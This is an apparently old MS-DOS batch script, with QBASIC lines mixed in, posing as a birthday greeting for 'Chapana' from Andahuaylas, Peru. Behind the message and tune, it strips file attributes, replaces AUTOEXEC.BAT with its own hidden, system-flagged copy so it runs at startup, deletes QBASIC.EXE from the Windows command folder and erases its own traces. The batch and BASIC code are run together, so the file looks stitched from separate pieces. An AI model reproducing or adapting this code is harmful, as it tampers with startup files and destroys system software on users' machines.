@ECHO OFF
PATH=C:\WINDOWS;C:\WINDOWS\COMMAND
ATTRIB -R -S -H C:\CSP_C.BAS
ATTRIB -R -S -H C:\AUTOEXEC.BAT
ATTRIB -R -S -H C:\CSP_C_AU.BAT
ATTRIB -R -S -H C:\CHAPANA.BAT
CLS
QBASIC/RUN CSP_C.BAS
CLS
ECHO "CSP_CUMPLEA�OS"
ECHO.
ECHO ANDAHUAYLAS - APURIMAC - PERU
ECHO.
ECHO 1 DE ENERO DEL 2000
ECHO.
ECHO (CHAPANA)
ECHO.
PAUSE
CLS
C:\CHAPANA.BAT
C:\CSP_C.BAS
LOCATE 12, 13
@PRINT "EL 11 DE JUNIO ES EL CUMPLEA�OS DE CHAPANA CELEBREMOS!!!"
PLAY "O3 C8 C8 D2"
PLAY "CG F2 C8 O4 O3 AF"
PLAY "E D2 T90 B-8 B-8 AF GF.P2"
SYSTEM
C:\CHAPANA.BAT
DEL AUTOEXEC.BAT
DEL CSP_C.BAS
REN CSP_C_AU.BAT AUTOEXEC.BAT
ATTRIB +R +S +H C:\AUTOEXEC.BAT
CD WINDOWS\COMMAND
DEL QBASIC.EXE
CD\
DEL CHAPANA.BAT
C:\CSP_C.BAS
C:\CSP_C_AU.BAT
C:\AUTOEXEC.BAT
C:\CHAPANA.BAT
